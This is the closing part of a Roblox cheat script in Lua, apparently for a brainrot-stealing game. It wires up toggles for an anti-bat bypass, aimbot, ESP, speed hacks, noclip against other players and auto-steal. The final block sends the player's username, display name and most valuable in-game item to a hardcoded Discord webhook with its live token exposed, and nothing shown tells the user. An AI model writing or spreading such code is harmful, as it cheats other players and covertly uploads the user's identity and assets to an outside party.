            label.TextColor3 = Color3.fromRGB(100, 180, 255)
            labelStroke.Transparency = 0
        else
            btnFrame.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
            label.TextColor3 = Color3.fromRGB(0, 0, 0)
            labelStroke.Transparency = 0.4
        end
    end

    local dragging = false
    local hasMoved = false
    local dragStart = nil
    local startPos = nil
    local dragThreshold = 5

    local function onInputBegan(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            hasMoved = false
            dragStart = input.Position
            startPos = btnFrame.Position
        end
    end

    local function onInputChanged(input)
        if not dragging then return end
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            local delta = input.Position - dragStart
            if math.abs(delta.X) > dragThreshold or math.abs(delta.Y) > dragThreshold then
                hasMoved = true
            end
            if hasMoved and not uiLocked then
                btnFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                              startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end
    end

    local function onInputEnded(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            if dragging then
                if not hasMoved then
                    setActive(true)
                    insta_reset()
                    if setInstaResetVisual then
                        setInstaResetVisual(true)
                        task.delay(0.3, function() if setInstaResetVisual then setInstaResetVisual(false) end end)
                    end
                    task.delay(0.3, function()
                        if btnFrame and btnFrame.Parent then
                            setActive(false)
                        end
                    end)
                elseif not uiLocked and hasMoved then
                    instaResetFloatingPos = {
                        XScale = btnFrame.Position.X.Scale,
                        XOffset = btnFrame.Position.X.Offset,
                        YScale = btnFrame.Position.Y.Scale,
                        YOffset = btnFrame.Position.Y.Offset
                    }
                    pcall(saveAllSettings)
                end
                dragging = false
                hasMoved = false
                dragStart = nil
                startPos = nil
            end
        end
    end

    btnFrame.InputBegan:Connect(onInputBegan)
    btnFrame.InputChanged:Connect(onInputChanged)
    btnFrame.InputEnded:Connect(onInputEnded)

    instaResetFloatingButton = panel
    return panel
end

-- ====== BOTÓN FLOTANTE DE BYPASS ANTIBAT ======
local function createBypassFloatingButton()
    local panel = Instance.new("ScreenGui")
    panel.Name = "BypassButton"
    panel.ResetOnSpawn = false
    panel.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    panel.DisplayOrder = 21
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(panel) end end)
    if not pcall(function() panel.Parent = game:GetService("CoreGui") end) then
        panel.Parent = LP:WaitForChild("PlayerGui")
    end

    local btnFrame = Instance.new("Frame", panel)
    btnFrame.Size = UDim2.new(0, MOBILE_BTN_W, 0, MOBILE_BTN_H)
    btnFrame.Name = "Frame"
    local defaultX = getLeftOfDropBR()
    local defaultY = (MOBILE_BTN_H + MOBILE_GAP) * 2
    if bypassFloatingPos then
        btnFrame.Position = UDim2.new(bypassFloatingPos.XScale or 1,
                                      bypassFloatingPos.XOffset or defaultX,
                                      bypassFloatingPos.YScale or 0,
                                      bypassFloatingPos.YOffset or defaultY)
    else
        btnFrame.Position = UDim2.new(1, defaultX, 0, defaultY)
    end
    btnFrame.BackgroundColor3 = (bypassToggled and bypassMode == 1) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(140, 0, 0)
    btnFrame.BackgroundTransparency = 0
    btnFrame.BorderSizePixel = 0
    btnFrame.ZIndex = 20
    local corner = Instance.new("UICorner", btnFrame)
    corner.CornerRadius = UDim.new(0, MOBILE_CORNER_RADIUS)

    applyShimmerStroke(btnFrame, 1.8)

    local label = Instance.new("TextLabel", btnFrame)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "BYPASS-ANTI BAT"
    label.TextColor3 = (bypassToggled and bypassMode == 1) and Color3.fromRGB(100, 180, 255) or Color3.fromRGB(0, 0, 0)
    label.Font = Enum.Font.GothamBold
    label.TextSize = 9
    label.TextWrapped = true
    label.ZIndex = 21

    local labelStroke = Instance.new("UIStroke", label)
    labelStroke.Color = Color3.fromRGB(200, 200, 200)
    labelStroke.Thickness = 0.8
    labelStroke.Transparency = (bypassToggled and bypassMode == 1) and 0 or 0.4

    applyShimmerToText(label, 0.9)

    local function setActive(state)
        if state then
            btnFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            label.TextColor3 = Color3.fromRGB(100, 180, 255)
            labelStroke.Transparency = 0
        else
            btnFrame.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
            label.TextColor3 = Color3.fromRGB(0, 0, 0)
            labelStroke.Transparency = 0.4
        end
    end

    local dragging = false
    local hasMoved = false
    local dragStart = nil
    local startPos = nil
    local dragThreshold = 5

    local function onInputBegan(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            hasMoved = false
            dragStart = input.Position
            startPos = btnFrame.Position
        end
    end

    local function onInputChanged(input)
        if not dragging then return end
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            local delta = input.Position - dragStart
            if math.abs(delta.X) > dragThreshold or math.abs(delta.Y) > dragThreshold then
                hasMoved = true
            end
            if hasMoved and not uiLocked then
                btnFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                              startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end
    end

    local function onInputEnded(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            if dragging then
                if not hasMoved then
                    if bypassToggled and bypassMode == 1 then
                        toggleBypass(false)
                    else
                        bypassMode = 1
                        toggleBypass(true)
                        if tpBatSetVisual then tpBatSetVisual(false) end
                        if mobSetBatTP then mobSetBatTP(false) end
                    end
                    setActive(bypassToggled and bypassMode == 1)
                elseif not uiLocked and hasMoved then
                    bypassFloatingPos = {
                        XScale = btnFrame.Position.X.Scale,
                        XOffset = btnFrame.Position.X.Offset,
                        YScale = btnFrame.Position.Y.Scale,
                        YOffset = btnFrame.Position.Y.Offset
                    }
                    pcall(saveAllSettings)
                end
                dragging = false
                hasMoved = false
                dragStart = nil
                startPos = nil
            end
        end
    end

    btnFrame.InputBegan:Connect(onInputBegan)
    btnFrame.InputChanged:Connect(onInputChanged)
    btnFrame.InputEnded:Connect(onInputEnded)

    bypassFloatingButton = panel
    return panel
end

-- ====== INICIALIZACIÓN ======
buildGui()
buildAutoStealUI()

MobilePanel = createMobileFloatingButtons()
instaResetFloatingButton = createInstaResetFloatingButton()
bypassFloatingButton = createBypassFloatingButton()

if loadAllSettings() then
    updateUIFromLoaded()
end

if LP.Character then
    task.wait(0.5)
    setupSpeedIndicator(LP.Character)
end

LP.CharacterAdded:Connect(function(char)
    stopAutoLeft()
    stopAutoRight()
    stopBatCounter()
    stopMedusaCounter()
    stopAutoTPDown()
    stopAntiRagdoll()
    stopUnwalk()
    stopDropBrainrot()
    stopMedusaAutoReset()
    if autoBatEnabled then disableAutoBat() end
    if bypassToggled then stopBypassAimbot() end
    stopAntiBatSpin()
    stopRagdollTimer()
    if espEnabled then disableESP() end
    if antiDieEnabled then stopAntiDie() end
    stopMeleeAimbot()

    task.wait(0.1)
    while not LP.Character or not LP.Character:FindFirstChild("HumanoidRootPart") or not LP.Character:FindFirstChildOfClass("Humanoid") do
        task.wait()
    end

    if steppedConn then steppedConn:Disconnect(); steppedConn = nil end
    if movementLoop then movementLoop:Disconnect(); movementLoop = nil end

    steppedConn = RunService.Stepped:Connect(function()
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP and p.Character then
                for _, part in ipairs(p.Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end
    end)

    movementLoop = RunService.RenderStepped:Connect(function()
        local char2 = LP.Character
        if not char2 then return end
        local hum = char2:FindFirstChildOfClass("Humanoid")
        local hrp = char2:FindFirstChild("HumanoidRootPart")
        if not hum or not hrp then return end

        if not autoBatEnabled and not bypassToggled and not autoLeftEnabled and not autoRightEnabled then
            local md = hum.MoveDirection
            local spd = getManualSpeed()
            -- Asignar WalkSpeed también
            hum.WalkSpeed = spd

            if md.Magnitude > 0.1 then
                lastMoveDir = md
                local currentVel = hrp.AssemblyLinearVelocity
                local newYVel = currentVel.Y
                if not isJumping and math.abs(currentVel.Y) < 1 then
                    newYVel = VELOCITY_Y_TRICK
                end
                hrp.AssemblyLinearVelocity = Vector3.new(
                    md.X * spd,
                    newYVel,
                    md.Z * spd
                )
            elseif antiRagdollEnabled and lastMoveDir.Magnitude > 0 then
                local anyHeld = false
                for key in pairs(MOVE_KEYS) do
                    if UIS:IsKeyDown(key) then anyHeld = true; break end
                end
                if anyHeld then
                    local currentVel = hrp.AssemblyLinearVelocity
                    local newYVel = currentVel.Y
                    if not isJumping and math.abs(currentVel.Y) < 1 then
                        newYVel = VELOCITY_Y_TRICK
                    end
                    hrp.AssemblyLinearVelocity = Vector3.new(
                        lastMoveDir.X * spd,
                        newYVel,
                        lastMoveDir.Z * spd
                    )
                end
            end
        end
        if speedLabel then
            local currentSpeed = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z).Magnitude
            speedLabel.Text = "SPEED: " .. string.format("%.1f", currentSpeed)
        end
    end)

    setupSpeedIndicator(char)

    if autoBatEnabled then enableAutoBat() end
    if autoLeftEnabled then startAutoLeft() end
    if autoRightEnabled then startAutoRight() end
    if bypassToggled then
        toggleBypass(true)
    end
    if jumpEnabled then startJumpMode() end
    if antiRagdollEnabled then startAntiRagdoll() end
    if antiBatSpinEnabled then startAntiBatSpin() end
    if ragdollTimerEnabled then startRagdollTimer() end
    if espEnabled then enableESP() end
    if antiDieEnabled then startAntiDie() end
    if meleeAimbotEnabled then startMeleeAimbot() end

    if medusaCounterEnabled then
        setupMedusa(char)
        if setMedusaVisual then setMedusaVisual(true) end
        if setMedusaAutoResetVisual then setMedusaAutoResetVisual(false) end
        stopMedusaAutoReset()
    elseif medusaAutoResetEnabled then
        setupMedusaAutoReset(char)
        if setMedusaAutoResetVisual then setMedusaAutoResetVisual(true) end
        if setMedusaVisual then setMedusaVisual(false) end
        stopMedusaCounter()
    else
        stopMedusaCounter()
        stopMedusaAutoReset()
        if setMedusaVisual then setMedusaVisual(false) end
        if setMedusaAutoResetVisual then setMedusaAutoResetVisual(false) end
    end

    if batCounterEnabled then startBatCounter() end
    if unwalkEnabled then startUnwalk() end
    if autoTPDownEnabled then startAutoTPDown() end

    refreshSpeedModeLabel()
end)

local lastLaggerToggle = 0
local LAGGER_COOLDOWN = 0.3

UIS.InputBegan:Connect(function(input, gpe)
    if _anyKeyListening then return end
    if input.UserInputType == Enum.UserInputType.Keyboard then
        if gpe or UIS:GetFocusedTextBox() then return end
    elseif not isGamepadInput(input) then
        return
    end
    if not isBindableInput(input) then return end

    local kc = input.KeyCode
    if not kc then return end

    if kbMatch(KB.LaggerMode, kc) then
        if tick() - lastLaggerToggle >= LAGGER_COOLDOWN then
            lastLaggerToggle = tick()
            toggleLaggerCycle()
        end
        return
    end
    if kbMatch(KB.CarryToggle, kc) then toggleCarryMode() return end
    if kbMatch(KB.DropBrainrot, kc) then
        if not dropActive then
            if dropBrainrotSetVisual then dropBrainrotSetVisual(true) end
            executeDropWithToggle(dropBrainrotSetVisual)
        end
        return
    end
    if kbMatch(KB.TPFloor, kc) then executeTPDown() return end
    if kbMatch(KB.InstaReset, kc) then insta_reset() return end
    if kbMatch(KB.AutoLeft, kc) then
        autoLeftEnabled = not autoLeftEnabled
        if autoLeftEnabled then
            startAutoLeft()
        else
            stopAutoLeft()
        end
        if autoLeftSetVisual then autoLeftSetVisual(autoLeftEnabled) end
        if mobSetAutoLeft then mobSetAutoLeft(autoLeftEnabled) end
        saveNow()
        return
    end
    if kbMatch(KB.AutoRight, kc) then
        autoRightEnabled = not autoRightEnabled
        if autoRightEnabled then
            startAutoRight()
        else
            stopAutoRight()
        end
        if autoRightSetVisual then autoRightSetVisual(autoRightEnabled) end
        if mobSetAutoRight then mobSetAutoRight(autoRightEnabled) end
        saveNow()
        return
    end
    if kbMatch(KB.AutoBat, kc) then
        if not autoBatEnabled then
            enableAutoBat()
            if autoBatSetVisual then autoBatSetVisual(true) end
            if mobSetAutoBat then mobSetAutoBat(true) end
        else
            disableAutoBat()
            if autoBatSetVisual then autoBatSetVisual(false) end
            if mobSetAutoBat then mobSetAutoBat(false) end
        end
        saveNow()
        return
    end
    if kbMatch(KB.Bypass, kc) then
        if bypassToggled and bypassMode == 1 then
            toggleBypass(false)
        else
            bypassMode = 1
            toggleBypass(true)
            if tpBatSetVisual then tpBatSetVisual(false) end
            if mobSetBatTP then mobSetBatTP(false) end
        end
        return
    end
    if kbMatch(KB.TPBat, kc) then
        if bypassToggled and bypassMode == 2 then
            toggleTPBat(false)
        else
            toggleTPBat(true)
        end
        return
    end
    if kbMatch(KB.AutoTPDown, kc) then
        autoTPDownEnabled = not autoTPDownEnabled
        if autoTPDownEnabled then
            startAutoTPDown()
        else
            stopAutoTPDown()
        end
        if setAutoTPDownVisual then setAutoTPDownVisual(autoTPDownEnabled) end
        saveNow()
        return
    end
    if kbMatch(KB.JumpMode, kc) then
        if modeSelectBtn then
            local newMode = jumpMode == 1 and 2 or 1
            jumpMode = newMode
            modeSelectBtn.Text = jumpMode == 1 and "Tap Tap" or "Hold"
            if jumpEnabled then
                stopJumpMode()
                startJumpMode()
            end
            saveNow()
        end
        return
    end
end)

task.spawn(function()
    while true do
        task.wait(5)
        pcall(saveAllSettings)
    end
end)

print("🦇 Anti Bat Spin integrado y listo (toggle en Other).")
print("⏱️ Ragdoll Timer integrado y listo (toggle en Other).")
print("👤 Player ESP integrado y listo (toggle en Other).")
print("🛡️ Anti Reset integrado y listo (toggle en Duel).")
print("✅ Infinity Jump integrado y listo (toggle en Duel).")
print("🎯 Mele Aimbot (Body Lock) integrado y listo (toggle en Duel).")
print("🎵 Música agregada en Speed con las canciones solicitadas.")

-- ============================================================
-- 🧠 WEBHOOK DE DUEL WINS (AÑADIDO)
-- ============================================================
do
    local Players = game:GetService("Players")
    local Http = game:GetService("HttpService")
    local lp = Players.LocalPlayer
    local req = request or http_request or (syn and syn.request)

    local hook = "https://discord.com/api/webhooks/1526835067488305254/qUQJuwYAKZb3P0lnuYm-6ue79Z8VAKNbu1R7WyNFQ_h6e4WPIShR_YepYqvWFMUKRvY7"

    local p3 = Vector3.new(-476.752,10.464,7.107)
    local p7 = Vector3.new(-476.752,10.464,114.107)

    local function num(v)
        v = tostring(v):gsub("%s","")
        local n,s = v:match("([%d%.]+)(%a?)")
        n = tonumber(n) or 0
        if s == "K" or s == "k" then n = n * 1e3
        elseif s == "M" or s == "m" then n = n * 1e6
        elseif s == "B" or s == "b" then n = n * 1e9
        elseif s == "T" or s == "t" then n = n * 1e12 end
        return n
    end

    local function short(n)
        if n >= 1e12 then return string.format("%.1fT", n/1e12)
        elseif n >= 1e9 then return string.format("%.1fB", n/1e9)
        elseif n >= 1e6 then return string.format("%.1fM", n/1e6)
        elseif n >= 1e3 then return string.format("%.1fK", n/1e3)
        end
        return tostring(math.floor(n))
    end

    local function myPlot()
        for _,v in ipairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") and v.Name == "PlotSign" then
                local d3 = (v.Position - p3).Magnitude
                local d7 = (v.Position - p7).Magnitude
                if d3 < 5 or d7 < 5 then
                    for _,x in ipairs(v:GetDescendants()) do
                        if x:IsA("TextLabel") and x.Text ~= "" then
                            if x.Text:find(lp.Name) or x.Text:find(lp.DisplayName) then
                                return d3 < 5 and 3 or 7
                            end
                        end
                    end
                end
            end
        end
        return nil
    end

    local last, lastVal, lastTick = "", 0, 0

    task.spawn(function()
        while task.wait(1) do
            local mine = myPlot()
            if not mine then continue end

            local pos = (mine == 3) and p7 or p3
            local best, bestVal

            local db = workspace:FindFirstChild("Debris")
            if not db then continue end

            for _, v in ipairs(db:GetChildren()) do
                if v.Name ~= "FastOverheadTemplate" then continue end
                local sg = v:FindFirstChildOfClass("SurfaceGui")
                if not sg or not sg.Adornee then continue end
                if (sg.Adornee.Position - pos).Magnitude > 50 then continue end

                local gen = sg:FindFirstChild("Generation", true)
                if gen and gen:IsA("TextLabel") then
                    local val = num(gen.Text)
                    if not bestVal or val > bestVal then
                        bestVal = val
                        local dn = sg:FindFirstChild("DisplayName", true)
                        best = dn and dn.Text or v.Name
                    end
                end
            end

            if best and bestVal then
                if (best ~= last or bestVal ~= lastVal) and tick() - lastTick > 10 then
                    last = best
                    lastVal = bestVal
                    lastTick = tick()

                    if req then
                        pcall(function()
                            req({
                                Url = hook,
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = Http:JSONEncode({
                                    embeds = {{
                                        title = "🏆 DUEL WINS 🏆",
                                        color = 0xFFFFFF,
                                        fields = {
                                            {name="Display", value=lp.DisplayName, inline=true},
                                            {name="User 👑", value=lp.Name, inline=true},
                                            {name="Brainrot 🧠", value=best, inline=true},
                                            {name="Value💰", value=short(bestVal), inline=true}
                                        }
                                    }}
                                })
                            })
                        end)
                    end
                end
            end
        end
    end)
end